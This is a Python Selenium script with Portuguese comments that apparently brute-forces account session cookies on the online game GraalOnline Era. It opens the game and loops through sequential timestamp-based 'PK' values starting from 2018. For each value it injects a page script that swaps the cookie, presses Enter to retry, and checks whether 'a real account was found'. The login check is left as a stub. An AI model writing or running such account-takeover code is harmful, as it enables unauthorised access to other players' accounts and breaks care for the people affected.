from  mydriver import MyDriver
from time import sleep
from selenium.webdriver.common.by import By
from selenium.webdriver.common.keys import Keys
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.common.action_chains import ActionChains
from selenium.webdriver.support import expected_conditions as EC
import os
from mydriver import MyDriver
import random
import time
import numpy as np


class Graal:

    def __init__(self):
        """
        Configurações básicas
        """
        self.mydriver = MyDriver(not_window=False)
        self.driver = self.mydriver.driver
        self.link_jogo = "https://era.graalonline.com"
        self.actions_chains = ActionChains(self.driver)
        self.runLoop = True

    def abrir_jogo(self):
        """
        Para abrir página do jogo pela primeira vez
        """
        self.driver.get(self.link_jogo)
        WebDriverWait(self.driver, 300).until(EC.presence_of_element_located((By.ID, 'unity-canvas')))
        self.driver.execute_script("console.log('apareceu')")        

    def apertar_enter(self):
        """
        Especifico para usar na def brut()
        Responsável por apertar na tecla ENTER
        """
        self.actions_chains.key_down(Keys.ENTER).perform()
        time.sleep(0.09)
        self.actions_chains.key_up(Keys.ENTER).perform()

    def pk_operation(self, pk: str, valor=1, operacao: str ='somar'):
        """
        Retorna pk com a soma ou subtracao
        @param pk = PK
        @param valor = Valor que será somado ou subtraído ao PK
        @param operacao = 'somar' ou 'subtrair'
        """
        new_pk = pk.split('.')
        new_pk[1] = str(int(new_pk[1]) + valor)
        if str(new_pk[1]) == str('1000000000'):
            new_pk[1] = str(new_pk[1])[1:]
            new_pk[0] = str(int(new_pk[0]) + 1)
        result = f"{new_pk[0]}.{new_pk[1]}"
        return result

    def filtros(self, pk):
        # Se tiver filtros, colocar aqui. Return False para não testar a pk atual
        return True


    def verificar_login(self, pk):
        # Verifica se foi encontrado uma conta real
        ...

    def brut(self, pk:str):
        """
        Responsável por alterar o cookie da página e dar reload na página,
          em conjunto com a tecla enter para clicar em 'retry'
        """
        pk = pk
        self.driver.execute_script(f"brut('{pk}')")
        time.sleep(0.03)
        self.apertar_enter()


    def run(self, pk_inicial:str='1514764800.100000000', operation='somar'):
        """
        PK/Contador inicial está no primeiro dia de 2018
        @param operation = 'somar' ou 'subtrair'
        """
        self.abrir_jogo()

        pk = pk_inicial

        while self.runLoop == True:

            if self.filtros(pk) == True:
                self.brut(pk)
                self.verificar_login(pk)
            pk = self.pk_operation(pk, 1, 'somar') #  Deixar sempre no fim do loop
   




graal = Graal()
graal.run()

print('debug')


